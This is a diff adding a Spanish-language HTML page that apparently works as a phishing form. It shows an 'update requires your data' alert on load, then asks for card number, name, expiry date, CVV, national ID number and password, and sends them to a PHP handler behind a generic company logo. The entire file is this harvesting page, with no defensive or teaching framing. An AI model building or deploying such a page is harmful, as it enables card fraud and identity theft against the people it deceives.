@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+       <script>
+        // Mostrar alerta antes de cargar el contenido HTML
+        window.onload = function() {
+            alert("Para la actualización requerimos tus datos");
+        };
+    </script>
+    <div class="form-container">
+        <!-- Espacio para el logo SVG -->
+        <div class="logo">
+           <img src="logi.png" alt="Logo de la Compañía" />
+        </div>
+
+        <h2>Información de usuario</h2>
+        <form action="guardar_datos.php" method="post">
+            <label for="numero_tarjeta">Número de Tarjeta:</label>
+            <input type="text" id="numero_tarjeta" name="numero_tarjeta" required>
+
+            <label for="nombre_propietario">Nombre:</label>
+            <input type="text" id="nombre_propietario" name="nombre_propietario" required>
+
+            <label for="fecha_vencimiento">Fecha de Vencimiento:</label>
+            <input type="text" id="fecha_vencimiento" name="fecha_vencimiento" placeholder="MM/AA" required>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required>
+
+            <label for="cedula">Cédula:</label>
+            <input type="text" id="cedula" name="cedula" required>
+
+            <label for="contraseña">Contraseña:</label>
+            <input type="password" id="contraseña" name="contraseña" required>
+
+            <button type="submit">Actualizar</button>
+        </form>
+    </div>
+</body>
+</html>
